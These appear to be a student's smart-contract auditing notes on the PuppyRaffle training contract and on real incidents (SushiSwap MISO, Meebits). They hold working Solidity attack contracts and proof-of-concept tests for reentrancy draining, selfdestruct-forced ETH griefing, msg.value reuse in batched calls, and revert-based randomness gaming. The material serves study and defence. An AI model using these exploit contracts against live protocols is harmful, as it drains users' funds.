## Attack Vectors and Learning

# 1 DOS ATTACK - UNBOUNDED FOR LOOP

```javascript
function testFuzz_CanEnterRaffle(address[] memory players) public {
hoax(playerOne, 10000 ether);
vm.assume(players.length > 200);
puppyRaffle.enterRaffle{value: entranceFee \* players.length}(players);
}
```

test to see if calling enter lottery with a large amount of addresses can cause DOS attack with a large amount of addresses passed into the players array. note about how we can set
a limit on the amount of addresses for each fuzz test using vm.assume. if you run forge test --mt testFuzz -vvvv --block-gas-limit 3000000 which limits the gas limit to a value i have set,
it will cause an evmerror which causes the function not to work. to run this test, comment out the duplicate check from the enterraffle function to allow the test run in the fuzzer.

if you tried to assume the length of the players array was >256, it wont work because the max array size allowed for fuzzing is 256. you can read this dicussion on github and see where the limit is set https://github.com/foundry-rs/foundry/discussions/3948. in reality, an attacker could send more than 256 addresses in the array and cause this evm error on an actual chain.

# 2 USING BUG DEFINITION REFACTOR THEORY TO REFACTOR POINT 1 TO MAKE IT MEDIUM SEVERITY, MORE GAS TO INTITILIASE EMPTY STATE VARIABLE

In point 1, the likelihood of someone calling enterRaffle with 200 addresses is unlikely so a developer looking at this might think this situation is unrealistic and tell you that the severity
of your bug is informational/low. they would be correct in saying that but its just because the way you presented it was wrong. On watching cyfrin course, I learnt that this same DOS
attack can be presented in the following way:

<details>

<summary>Code</summary>

```javascript
function test_gasgetsmoreexpensiveperentrant(
        address[] memory players,
        address[] memory players2,
        address[] memory players3
    ) public {
        address user1 = vm.addr(1);
        address user2 = vm.addr(2);
        address user3 = vm.addr(3);

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        address[] memory players2 = new address[](4);
        players2[0] = playerFive;
        players2[1] = playerSix;
        players2[2] = playerSeven;
        players2[3] = playerEight;

        address[] memory players3 = new address[](4);
        players3[0] = playerNine;
        players3[1] = playerTen;
        players3[2] = playerEleven;
        players3[3] = playerTwelve;

        vm.deal(user1, 1000 ether);
        vm.deal(user2, 1000 ether);
        vm.deal(user3, 1000 ether);
        vm.prank(user1);
        vm.startSnapshotGas("externalA");
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasUsed = vm.stopSnapshotGas();

        vm.prank(user2);
        vm.startSnapshotGas("externalB");
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        uint256 gasUsed2 = vm.stopSnapshotGas();

        vm.prank(user3);
        vm.startSnapshotGas("externalC");
        puppyRaffle.enterRaffle{value: entranceFee * players3.length}(players3);
        uint256 gasUsed3 = vm.stopSnapshotGas();

        assertGt(gasUsed3, gasUsed2);
    }

```

</details>

Instead of using one entrant with 200 addresses, how about 3 different entrants with 4 addresses. remember that a denial of service doesnt always mean that the function
is uncallable as we noted in the audit notes. it can also mean where it restricts users from calling a function. In the above test, we tested that with each new entrant,
the gas paid to enter the function continues to rise. This means that at one point, if there are multiple entrants, the xth participant, will have to pay exponentially
more gas than the second entrant. I do this by comparing the gas from the second entrant to the gas paid by the 3rd entrant and you will see that the gas paid by the
3rd entrant is a lot more than the gas paid by the second entrant which proves the denial of service as for each subsequent entrant, the gas keeps increasing. this is
how to refactor the DOS from point 1 and now the severity of this goes from low/informational to high because the impact of this is high and so is the likelihood.

You will notice that the first entrant pays more gas than the second entrant and you might be wondering why that is. This is because When a storage slot (e.g., an array or mapping entry) is accessed for the first time, the EVM must allocate storage space.This operation is considered a write to a zero-initialized storage slot, costing 20,000 gas. In subsequent calls, the EVM does not need to initialize the storage slot again; it merely updates the existing value. This is much cheaper, costing 5,000 gas.

# 3 MAPPINGS TO AVOID FOR LOOP

Can use mapping instead of loads of for loops for no reason. see bad code below:

```javascript
 function enterRaffle(address[] memory newPlayers) public payable {
        //q modularity can be improved by only allowing one player to enter at a time
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        ); //a can use custom error and if statement to save gas
        for (uint256 i = 0; i < newPlayers.length; i++) {
            //a whenever you see a for loop, you need to ask why it is there and if it can be avoided
            players.push(newPlayers[i]);
        }

        // Check for duplicates
         for (uint256 i = 0; i < players.length - 1; i++) {
            //a you can use a mapping to store each address with a boolean and use this mapping in the first for loop to check for duplicates. this for loop is unneccesary
            for (uint256 j = i + 1; j < players.length; j++) {
                require(
                    players[i] != players[j],
                    "PuppyRaffle: Duplicate player"
                );
            }
        }
        emit RaffleEnter(newPlayers);
    }

```

# 4 MISHANDLING OF ETH (SELF DESTRUCT)

Mishandling of eth can happen in many different ways. The idea is that when handling sending raw eth to/from a contract, a bunch of things can go very wrong. We will go through 2 of the ways (self-destruct opcode and using msg.value in a loop) this can be spotted but it is definitely not limited to these 2. As you keep growing in the space, you will discover more of these.

Whenever you see address(this).balance, your mind must go to an attacker calling selfdestruct opcode and force sending eth to the contract to alter this balance and think about what the effect of this is on the contract. more on this is in your security and auditing course notes. In this case, it will stop anyone from calling withdraw fees function.

```javascript
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!"); //bug if someone uses selfdestruct to send eth to this contract,  no one will be able to withdraw fees
```

I used the following contract to exploit the code:

<details>

<summary>Code</summary>

```javascript
//SDPX-license-Identifier: MIT

pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Preventwithdrawfees {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        selfdestruct(payable(target));
    }
}
```

Running the following test will exploit the withdrawfees function and make all the fees unwithdrawable from the contract:

```javascript
function test_canpreventwithdrawfeesfromrunning() public playersEntered {
        (bool success, ) = address(preventwithdrawfees).call{value: 1 ether}(
            ""
        );
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

```

</details>

in the above code, althought the fees should be withdrawable, since i have sent funds to the `PuppyRaffle` contract and the contract has no logic to deal with raw eth transfers, the funds i sent to the contract will stay there and constantly revert with the above error because address(this).balance ==
uint256(totalFees) will never be true as long as the value i sent to `PuppyRaffle` remains.

# 5. MISHANDLING OF ETH (MSG.VALUE USED IN A LOOP)

Lets look at the next mishandling of eth issue which is using msg.value in a for loop. Before we start looking at this exploit, there is a key thing that studying this
taught me which was that just becuase 2 safe components are used together doesnt mean that their interaction couldnt be unsafe. This exploit will be a perfect example
and what it teaches is that if you are auditing any protocol, if the protocol has imports and inherits any of the contracts it is importing, you need to go and look at
ALL the functions in that imported contract even if the main contract doesnt call some of those functions. since the contract inherits from the imported contract,
any public functions in the inherited contract can be called in the main contract. so you need to look at all the functions in the inherited contract and try to see
which functions you might be able to combine from the imported contract with a function in the main contract that you can use to exploit a protocol. This is so important
because most complex bugs you find will come in this way. it will hardly be the case that interactions in the same contract will reveal major exploits for protocols that
actually know what they are doing.

Lets begin looking at the exploit that found the msg.value used in a loop. The 2 articles linked below will explain how the exploit occured and I will be explaining the
first link in detail as well as providing some poc's you can check out.

https://samczsun.com/two-rights-might-make-a-wrong/
https://coinmarketcap.com/academy/article/how-white-hats-saved-sushiswap-from-potential-350-million-exploit

The exploit never happened as the whitehat hackers were able to find the vulnerability before any hacker did luckily but we will be exploring their findings. The main idea
was that sushiswap launched a miso platform where protocols could launch their tokens using auctions. They used batch and dutch auction. the exploit in particular was spotted
when a protocol called bitdao wanted to launch their tokens using the dutch auction.

All the backstory is in the first link so no need to go over that. The first thing I did was to understand what a dutch auction was which i did at https://dutchswap.readthedocs.io/en/latest/auctions/dutch_auction.html
After this, I had a background on the code i was about to look at. the first article provided a link to the etherscan where i could see the dutch auction contract. I knew
I needed the full repo of this project in order to perform any audit so i read the contract on etherscan and in the comments, the repo was provided which i copied and cloned
locally for me to perform my own tests. You can see the cloned project in a MISO folder in the securityresearchcyfrin directory. With this, i could start looking at all the
code. You can see how using the tincho process is so crucial here.

The repo was at https://github.com/chefgonpachi/MISO/ and at the time i accessed it, the contracts had been updated to remove the part of the contract that could be
exploited so i needed to find the commit before the contracts were updated so as you know, i looked in the repo for the last commit before the exploit was spotted
by comparing dates of the write up with commit dates on github and i found the commit hash i was looking for and i used git checkout to view it locally which is
a technique you know about.

In the samczsun link above, after reading that and comparing it to the dutchauction contract i was looking at in my local miso directory, I will now explain how the exploit
works and you can do in this directory and see it yourself and I will show with a poc how this works. The attacker could call a batch function from the inherited boringbatchable
contract. This function allowed any user to batch many calls in a single function. So you could use this function to call multiple functions in a list instead of calling each
function one at a time. This function wasnt actually used at all in the dutchauction contract. The reason boringbatchable was inherited was for another function it contained but
this batch function was in that contract and it was an external function which meant that anyone could call it at anytime on the dutchauction contract. This is what I meant when
I said you need to look into all the functions in the imported contracts because even if the function isnt used directly in the main contract code, if it is inherited, it can be
called and can be used for exploits. Also keep this boringbatchable contract in mind because that batch function and other functions in boringbatchable can be useful for your day
to day stuff. The batch function uses a delegatecall low level function to make the call for each function which I didnt think was needed since the functions being called will
always be functions inside the contract and not proxies so i didnt see the need for using delegatecall rather than just a normal low level call but it didnt make much difference.
It was just interesting to spot that.

Anyway , the idea is that the attacker can call this batch function and use it to batch multiple commiteth calls in the dutchauction contract. the commiteth function is used when
someone wants to send eth to the contract and commit that eth to the token sale. The key to the exploit was in the following line of code in the commiteth function:

```javascript
require(msg.value > 0, "BatchAuction: Value must be higher than 0");
```

This seems like a very harmless line that checks if the value of eth being sent is greater than 0 and in this line alone, there is no error. It is a normal check for the commitEth
function and doesnt cause any issues when commiteth is called by any user. The problem comes when the attacker calls commiteth multiple times using the batch function. In the
batch function, there is a for loop that loops through every calldata and calls the function in the data. if the attacker calls the batch function with an array of calls that are
all commiteth. so say attacker calls commiteth 50 times, what will happen is that they can send the batch function with a msg.value of 1 ether for example.

Msg.value persists in the function and what that means is that msg.value remains the same throughout a function and doesnt change until the function is completed. so what this
means is that an attacker can call batch function and batch 10 commiteth calls but only send msg.value of 1 ether and that 1 ether will be used for all the commiteth calls.
how this will work is that the batch function loops through the calls array and carries out each call. Each call is a commiteth function. The commiteth function checks that msg.value >0
In the first call, msg.value will truly be greater than 0 because the attacker did send 1 ether with the batch function so the first call runs successfully and the user can commit 1
ether to the token sale and once the sale is done, the attacker will get 1 ether worth of the token at whatever price it was when they committed the eth. Then the for loop will run
again but since we are still in the same batch function, msg.value is still 1 ether as msg.value persists. so the next commiteth call will also be successful because msg.value is still
1 ether so it passes the check in the commiteth function. Now, the attacker has commited 2 eth but in reality, has only sent 1 eth to the contract. the attacker can keep doing this and
end up getting way more tokens than they actually paid for which is a massive bug. This is why using msg.value in a loop is a mishandling of eth exploit and whenever you see msg.value $
function, you need to make sure that there is nowhere that msg.value can be looped through.

This bug got even deeper for the bitdao dutch auction because the dutch auction has a hardcap implemented in it so if a person sends any eth once the auction has gone over the cap,
the commiteth function refunds their funds back to them. This presented a way for the hacker to get funds out of the contract becuase they could batch so many commiteth functions to
the contract until it goes over the hardcap and then since the commitment is basically free as the same msg.value is being used, whatever is refunded back to the attacker is free money
from the contract. so the contract will just send eth to the attacker which will be other users real eth deposits and the attacker can make a contract that keeps doing this until it drains
all the funds from the bitdao auction. this obviously meanrt the bug was way bigger than originally as now, the attacker has a way to get funds out the contract.

The samczsun article spoke about a points list that could be set while the auction was live. I went to the dutch auction contract to see more about this points list. I found a
pointlist.sol contract which contained a hasPoints function. This hasPoints function is called whenever a user calls commiteth. Commiteth calls an addcommittment function which
is where the hasPoints function is called. This function checks if an address has a certain number of points. The idea behind this is that the pointlist.sol contract can create a list of
addresses using a setPoints function kinda like a whitelist and if an address is in the \_accounts array with a sufficient \_amounts value in the setPoints function, they will be
allowed to finish calling the commiteth function in the dutch auction contract. if not, then the require statement in the addcommitment function would revert and that address
would not be able to commiteth.

To use this pointslist function, when intitialising the dutchauction contract, a pointlist contract had to be deployed and the address sent to the dutchauction contract. Once passed,
the dutch auction contract passes it to a setList function which configures it and sets a usePointList boolean to true. This is what allows the hasPoints function to get called.
This can be done at any time during the auction so if the boolean gets set to true, then no other address not on the whitelist will be able to commit eth or if they dont have enough
points, same story. This was the pause function the article was talking about. For the bitdao auction, they set the pointlist address to a zero address so this pause function was next
to impossible for them so they had to buy up to the hardcap themselves and end the auction to stop anyone from being able to exploit the contract which is spoken about in the second
link above. For the batch auction that was already live, i guess they had a points list contract deployed and wanted to use the haspoints and setpoints functions as the pause function
as a mitigation strategy.

This exploit had almost 350 million at risk and outlines the need for alarm bells to be ringing whenever you see msg.value in any codebase. This should prompt you to look through all loopss
in the codebase to see if msg.value is looped through in any of them.

Lets look at the POC I wrote to test this exploit on the bitdao project. The project was created using brownie and I couldnt use foundry to test this because the compiler v
version was too old and it was incompatible with foundry and led to a lot of compiler errors so i decided to brush up on my python and brownie skills by writing my tests in
the projects brownie test suite. This was the test I wrote:

```javascript
def test_dutch_auction_canbatchcommitethwithsamemsgvalue(dutch_auction):
    beneficiary = Beneficiary.deploy({"from": accounts[0]})
    # Define the parameters
    address = beneficiary
    boolean = True

    # Encode the parameters
    encoded_parameters = dutch_auction.commitEth.encode_input(address, boolean)
    prevbalance = beneficiary.balance()

    print(encoded_parameters)
    calls = []
    for i in range(11):
        calls.append(encoded_parameters)


    print(calls)
    dutch_auction.commitEth(accounts[0], True, {"from": accounts[0], "value":1000000000000000000})
    dutch_auction.commitEth(accounts[1], True, {"from": accounts[1], "value":1000000000000000000})
    dutch_auction.commitEth(accounts[3], True, {"from": accounts[3], "value":1000000000000000000})
    dutch_auction.commitEth(accounts[4], True, {"from": accounts[4], "value":1000000000000000000})
    dutch_auction.commitEth(accounts[5], True, {"from": accounts[5], "value":1000000000000000000})
    tx= dutch_auction.batch(calls, True, {"from": accounts[2], "value":1000000000000000000})
    assert beneficiary.balance()> prevbalance

```

The test was very simple. I simply started a dutch auction, used some other accounts to commit some eth to the auction normally to make sure the contract had some eth i could
steal. then i deployed a beneficiary contract that i wanted to receive the funds after i called the batch function. so when i encoded the commiteth function, i passed the
beneficiary contract address as the address that was 'committing' eth. So as I explained earlier, I called batch function and passed the commiteth function in the calls array
11 times so the commiteth function will get called 11 times via the batch function but i am only passing in 1 eth as a value to the batch function but since msg.value persists,
when the commiteth function checks if msg.value > 0, since msg.value = 1 in the batch function, that check in the commiteth function will always pass in the batch function.

so i am essentially committing 11 eth but have only sent 1 eth to the contract. In this test, the way I set up the dutch_auction contract was to make the max commitment = 9.9 eth.
I did this as i found the max committment calculation in the addCommittment function so i could manually calculate it based on the values passed to the initAuction function. In the
test suite for MISO, you will see a conftest.py which deploys a bunch of contracts for you before running any tests. so when you run brownie test, all the tests in the conftest.py
function will run first and one of those tests is to deploy a dutch_auction contract which is used in the test_dutch_auction.py file and I used it to run my poc above.
so to adjust the max committment value, all i had to do was play with the relevant values in the initauction function in the conftest.py file.

I encountered some errors and made some discoveries when carrying out all of these tests so look at point 2 in the errors section to see the errors and how I handled them.

# 6 Rentrancy

Usual reentrancy stuff. Attack was done on the refund function in `PuppyRaffle.sol` .See function below:

<details>

<summary>Code</summary>

```javascript
function refund(uint256 playerIndex) public {
        //a could be external
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

        payable(msg.sender).sendValue(entranceFee); //bug reentrancy attack. attacker can reenter function and call refund again

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

</details>

I attacked it by creating an `AttackContract` contract with the following code:

<details>

<summary>Code</summary>

```javascript
//SDPX-license-Identifier: MIT

pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract AttackContract {
    address public target;
    uint256 public entrancefee;

    event FallbackTriggered(uint256 balance, uint256 entrancefee);

    constructor(address _target, uint256 _entrancefee) {
        target = _target;
        entrancefee = _entrancefee;
    }

    function attack() public {
        PuppyRaffle(target).refund(2);
    }

    receive() external payable {
        if (target.balance >= entrancefee) {
            attack();
        }
    }

    function gettargetbalance() public view returns (uint256) {
        return target.balance;
    }
}


```

</details>

To prove that the contract could be exploited, i ran the following test in the test folder:

<details>

<summary>Code</summary>

```javascript
function test_canattackrefund() public {
        address user1 = vm.addr(1);
        vm.deal(user1, 100 ether);
        vm.startPrank(user1);
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        vm.stopPrank();

        address[] memory players2 = new address[](1);
        players2[0] = address(attackContract);
        puppyRaffle.enterRaffle{value: entranceFee}(players2);

        uint256 balance = attackContract.gettargetbalance();
        console.log("balance", balance);

        (bool success, ) = address(attackContract).call{value: entranceFee}("");
        assertEq(address(attackContract).balance, 4 ether);
    }

```

</details>

The test mimics an address entering the raffle with 2 addresses and then the attacker entering the address with the attacker contract address.
the attacker then sends 1 ether to the attacker contract which the receive function sees and calls the attack function which calls the refund function and once the function sends back the entrance fee to us, the contract receives ether with no calldata from `PuppyRaffle` contract which triggers receive function to run attack function again and call refund function again before the last refund function call finishes which means the code after the external call which updates state by removing the address from the players array doesn't run before the next refund function is called which keeps sending the entrancefee to the attacker contract again and again until target.balance < entrancefee which essentially drains all user funds in the contract.

# 7 RANDOMNESS DEFINED IN SAME FUNCTION AS EXECUTION LOGIC (WEAK RANDOMNESS)

The selectWinner function uses the following code to get a random number:

```javascript
keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty));
```

this number isnt random because none of its inputs are truly random. msg.sender is deterministic and so is block.timestamp and block.prevrandao(block.difficulty).
with prevrandao, it technically can class as a random number due to its design but the way it is generated is known and as a result, if enough validators decide to collude
, they could determine what the random number would be. Although validator collusion is difficult, it is not impossible which is why I am highlighting this as a problem.
All this data comes from the blockchain which is a deterministic system so there is no way to generate a truly random number on the blockchain. As a result, the number can
be predicted. In this case, weak randomness doesnt really affect this system as much because for an attacker to exploit, they need to know the random number at the block
where the raffle ends and that is dependent on if they call select winner function before anyone else. also there is no way to predict block.prevrandao so many blocks in
advance so it will be practically impossible to do.

There is a situation where having predictable randomness can be a problem and this was evident in the meebit nft exploit. You can read a breakdown of the exploit using the
following links:
https://iphelix.medium.com/meebit-nft-exploit-analysis-c9417b804f89
https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281/3

If you go through these links, you will see that to mint a meebit, you needed to have a cryptopunk or a glyph and you could mint the nft for free. You can use the above link
to read about how it worked but i am only going to talk about the interesting part of the exploit.

<details>

<summary>Code</summary>

```javascript

function mintWithPunkOrGlyph(uint _createVia) external reentrancyGuard returns (uint) {
    require(communityGrant);
    require(!marketPaused);
    require(_createVia > 0 && _createVia <= 10512, "Invalid punk/glyph index.");
    require(creatorNftMints[_createVia] == 0, "Already minted with this punk/glyph");
    if (_createVia > 10000) {
        // It's a glyph
        // Compute the glyph ID
        uint glyphId = _createVia.sub(10000);
        // Make sure the sender owns the glyph
        require(IERC721(glyphs).ownerOf(glyphId) == msg.sender, "Not the owner of this glyph.");
    } else {
        // It's a punk
        // Compute the punk ID
        uint punkId = _createVia.sub(1);
        // Make sure the sender owns the punk
        require(Cryptopunks(punks).punkIndexToAddress(punkId) == msg.sender, "Not the owner of this punk.");
    }
    creatorNftMints[_createVia]++;
    return _mint(msg.sender, _createVia);
}

function _mint(address _to, uint createdVia) internal returns (uint) {
    require(_to != address(0), "Cannot mint to 0x0.");
    require(numTokens < TOKEN_LIMIT, "Token limit reached.");
    uint id = randomIndex();

    numTokens = numTokens + 1;
    _addNFToken(_to, id);

    emit Mint(id, _to, createdVia);
    emit Transfer(address(0), _to, id);
    return id;
}

```

</details>

This was the function the protocol allowed users to call to mint the nft. The key part is that randomindex funtion which contained the following code:

```javascript
uint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;
```

This is similar to the weak randomness we see in the puppyraffle.sol contract but it wasnt actually this they used to exploit the contract. This was the contract that exploited this function:

<details>

<summary>Code</summary>

```javascript
pragma solidity 0.8.4;

interface IMeebits {
    function mintWithPunkOrGlyph(uint _createVia) external returns (uint);
}

contract Exploit {

    address private owner;
    mapping(uint => bool) internal meebitIds;
    IMeebits immutable meebits;

    constructor(address addr) {
        owner = msg.sender;
        meebits = IMeebits(addr);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    function deposit() public payable {}

    function addMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = true;
    }

    function deleteMeebit(uint meebitId) onlyOwner public {
        meebitIds[meebitId] = false;
    }

    function mintMeebit(uint _createVia) public returns(uint){

        // Mint a new meebit with a punk or glyph
        uint id = meebits.mintWithPunkOrGlyph(_createVia);

        // Make sure it's a desired rare meebit
        require(meebitIds[id], "Not a rare meebit");

        // Pay miner bribe to include the block
        (bool success, ) = block.coinbase.call{value: 1 ether}("");
        require(success);
        return id;
    }

    function recover(address recipient, uint256 value, bytes memory args) onlyOwner public {
        (bool success, ) = recipient.call{ value: value }(args);
        require(success);
    }

}
```

</details>

the hack occured because the random index to mint was gotten in the \_mint function. you can see the randomindex function called in the \_mint function. this was the problem.
I will explain how. th metadata for each meebit nft was public information so anyone could see which nft would be minted at each index number. so each meebit had predefined
attributes and some were rare than others. so the metadata listed all meebit nfts and which attribute it had. So you know that if you get nft with token id of 1, it will be
a certain meebit. the attacker got hold of this metadata so they knew which token id related to the most valuable nfts. this was crucial to the exploit. in the mint function,
when a user mints a meebit, a random number is generated to determine which tokenid they get which is what the random index function did.

so the hacker designed the above contract and i guess they added all the token id's of all the rare nfts they wanted to the meebitIds mapping using the addMeebit function.
the important function was the mintmeebit function which is where they called the mint function that mints nfts and as you saw above, that function returns the id of the nft minted.
the attacker then checked to see if the nft token id was one of the rare meebits they wanted from the meebitids function. if it wasnt, the function reverted.

You might be thinking since the mint function has already run to completion, the attacker has already minted one so how can the revert work? well in ethereum, transactions are atomic.
What this means is that with transactions, either all of the transaction succeeds or fails. if it fails or reverts. if any part of a transaction reverts, then all state changes are reverted

so with the attackers mintmeebit function, if the id isnt one of the ones in their mapping, then they reverted which means the state changes reverted which means that it would be like they
never minted anything. So the attacker kept calling the mintmeebit function until they got the rare nft they wanted.

this is how the attacker managed to mint the exact nft they wanted. Now the reason they were able to do this wasnt because of the weak randomness, but it was because the randomindex function was called in the mint function. this allowed the attacker to see the token id of the nft before they minted it. In one of the links above, it was suggessted that chainlink VRF wouldve mitigated this issue so i was wondering how.

technically, it isnt chainlink getting a truly random number off chain that would solve this because if a random number was gotten offchain and returned to the randomindex function, it wouldnt stop the attacker. its the chainlink logic of how they get the random number that wouldve prevented this. to understand this, let me bring in some code that uses chainlink vrf to get a random number:

<details>

<summary>Code</summary>

```javascript
function mint(bytes calldata performData) external override {

        uint256 requestId = requestRandomness(
            CALLBACKGASLIMIT,
            REQUESTCONFIRMATIONS,
            NUMWORDS
        );
        s_requests[requestId] = RequestStatus({
            paid: VRF_V2_WRAPPER.calculateRequestPrice(CALLBACKGASLIMIT),
            randomWords: new uint256[](0),
            fulfilled: false
        });
        s_currentlotterystate = s_lotterystate.calculating_winner;
        requestIds.push(requestId);
        lastRequestId = requestId;
        emit RequestSent(requestId, NUMWORDS);
    }

    function fulfillRandomWords(
        uint256 _requestId,
        uint256[] memory _randomWords
    ) internal override {
        require(s_requests[_requestId].paid > 0, "request not found");
        s_requests[_requestId].fulfilled = true;
        s_requests[_requestId].randomWords = _randomWords;
        emit RequestFulfilled(
            _requestId,
            _randomWords,
            s_requests[_requestId].paid
        );
        //whatever logic to use random number to get nft index to be minted
       _mint(addressthatcalledmintfunction, randomnft)
    }
```

</details>

Chainlink VRF runs in 2 stages as you can see above. if anything is unclear, go look at your hardhat and foundry course notes where you used VRF to get a random number.
the first stage is where the user calls a mint function. in this transaction , there is no random number generated. all this function does is request for a random
number from the chainlink oracles and update state. so if the attacker calls this mint function, they wont be able to see any random number as there is no random number
determined in the function. In fact, there is no minting done in this function at all, all this function does is ask chainlink oracles to get a random number. chainlink oracles get this request from the mint function, go offchain, get the random number and then the oracles call fulfillrandomwords with the random number returned into the fulfillRandomWords function and then in that function is where the random number is gotten and used to determine the randomnft to be minted and then mints it. This fulfillrandomwords function as you can see is internal so no one can call it apart from the contract.

this means the attacker cannot access any logic that has to do with the random value and once they call the mint function, if they revert, then nothing happens as the mint function doesnt handle the randomness so even if the attacker calls the mint function a million times, they wont be able to see which nft wouldve been minted.this idea isnt exclusive to chainlink though. the off chain random number might be but having one transaction to update state and another internal transaction to handle the random
number and do whatever with the random number can be implemented normally without chainlink. so to prevent the attack, the protocol couldve either removed randomness and allowed minting to be sequential oe if the randomness was a must, they could have had the mintWithPunkOrGlyph function not call \_mint directly. Instead, let the mintWithPunkOrGlyph function emit and event to show that a mint has been requested. then set up a listener that listens for that event amd once it sees that event, it then
calls \_mint from another contract where that contract is the only one allowed to call that function. This way, there are 2 transactions and the attacker cannot retrieve the id's. Doing this will mean that the logic for getting the random number and the logic for minting the token is handled in a function that the user cannot access. this prevents the attacker from being able to filter based on what token id is returned by the mint function (or they could use chainlink vrf which is easier).

So with this, you now know that whenever the random number is retrieved in the same function where the execution logic is, this is a red flag and all your alarm bells should be ringing as there will be a bug around the corner.

Lets use this logic in our Puppyraffle contract.
as you can see, in the selectwinner function, the random index is gotten, the same as it was in this exploit and then the exectuion logic(paying the winner) is handled in the same function so this should ring some alarm bells. So an attacker could follow the same logic as the attacker of meebit and call select winner function and check if they are the winner.
If they arent the winner, they could simply revert and call the refund function immediately to get their money back since they know that they arent going to win. This is a massive bug.This stresses why as an auditor, reading past audits is the main way you can improve. without this, you have no idea what to look out for because it is usually the same things that happen over and over again but with different masks. without looking into the meebit exploit, i would never have uncovered this bug. The poc for this bug is below:

Attack Contract

<details>

<summary>Code</summary>

```javascript

//SDPX-License-Identifier: MIT

pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Refundifnotwinner {
    address public winner;
    address public puppyRaffle;

    event neverhappened();

    constructor(address _winner, address _puppyRaffle) {
        winner = _winner;
        puppyRaffle = _puppyRaffle;
    }

    function refundpls() public {
        PuppyRaffle(puppyRaffle).selectWinner();
        (bool success, ) = puppyRaffle.call(
            abi.encodeWithSignature("selectWinner()")
        );
        if (PuppyRaffle(puppyRaffle).previousWinner() != winner) {
            emit neverhappened();
            revert("You are not the winner");
        }
    }
}
```

```javascript
function test_cancheckifiamwinnerandrefundifnot() public {
       address[] memory players = new address[](4);
       players[0] = playerOne;
       players[1] = playerTwo;
       players[2] = playerThree;
       players[3] = playerFour;

       address[] memory players2 = new address[](1);
       players2[0] = user2;

       vm.deal(user1, 1000 ether);
       vm.deal(user2, 1000 ether);

       vm.prank(user1);
       puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

       vm.startPrank(user2);
       puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
       uint256 prevbalance = user2.balance;

       vm.warp(block.timestamp + duration + 1);
       vm.roll(block.number + 1);

       (bool success, ) = address(refundifnotwinner).call(
           abi.encodeWithSignature("refundpls()")
       );
       if (!success) {
           puppyRaffle.refund(4);
       }
       vm.stopPrank();
       assertEq(user2.balance, prevbalance + entranceFee);
   }
```

</details>

This when this test is run, it shows that the attacker can check whether they are winner with the refundpls function in the attacker contract and if they arent (if the tx reverts), they can call the refund function and get their money back. So whenever you see a random number gotten in the same function that contains the logic on what to do with the random number, alarm bells should be going off in your head instantly.

# 8 INTEGER UNDERFLOW, OVERFLOW AND PRECISION LOSS

Underflow and Overflow are only obvious in 2 scenarios. integer overflow and underflow only happen in solidity versions prior to 0.8.0. any solidity version post 0.8.0 will throw an error to tell you that there is an overfloe or underflow risk on that line. The only time an error wont show in solidity versions post 0.8.0 is if you use the unchecked keyword. This keyword tells solidity not to check for underflows or overflows in the block of code that the unchecked keyword is pointing to. Precision loss happens in all solidity versions.

So whenever you see an unchecked keyword, you need to check the math in the block of code to make sure no underflows or overflows happen. Lets get into what underflows an overflows are. in solidity, integers have an upper limit. for example, if you cast any variable to uint8, the max value is 255 so if you try to add 1 to 255, it will loop back to 0. For underflow, uint8 has a minimum value of 0 so if you try to subtract 1 from 0 , it will loop back to 255 which might not be the protocols intended plan. For precision loss, say you are dividing 2 numbers like 225 and 4, we expect to see 56.25 but since we are using solidity and solidity doesnt do well with decimals, it will return 56 instead. In some cases, the .25 may not matter to the protocol but it is your job to spot it and let the protocol know that this is a potential issue and determine the severity of it. Whenever you see any calculations done in solidity, these 3 potential issues must be in your brain as a possible issue. To test any of these exploits, check out the sc-exploits-minimised repo where there are simplified examples of all of these.

Lets see how this affects the puppyraffle contract. In the selectwinner function, there are a lot of calculations and the solidity version is 0.7.6 so you know that underflows and overflows will not be checked. So every calculation you see should be assessed for underflows and overflows. A typical example would be:

```javascript
 uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
```

All these lines should ring alarm bells. The first 2 are dividing so you need to check for precision loss. if you see that precision loss can exist. the total fees adds 2 uint64's so you need to make sure there is no overflow present. if any of these are present, you need to check what the impact of these could be on the protocol. A simple fuzz test could help us check all of these. Just from looking at these lines of code, we can see some potential issues. There isnt really a risk of precision loss because each time, we are dividing each number by 100 which in most cases, will return a whole number and because most monetary values are calculated in wei due to the lack of decimal support in solidity. If there is ever a decimal returned in this calculation, the precision loss we get will be very minimal. What i mean is if you have totalamountcollected as 86, 80% of this is 68.8. In solidity, we know that the .8 will be discarded and this .8 might be very important to us depending on the calculation we are trying to get. For the above calculation, totalamountcollected will never be that low as 86 means 86 wei which just wouldnt happen as I would assume the entrancefee would not be that low. So in a case like this, we can accept the precision loss.

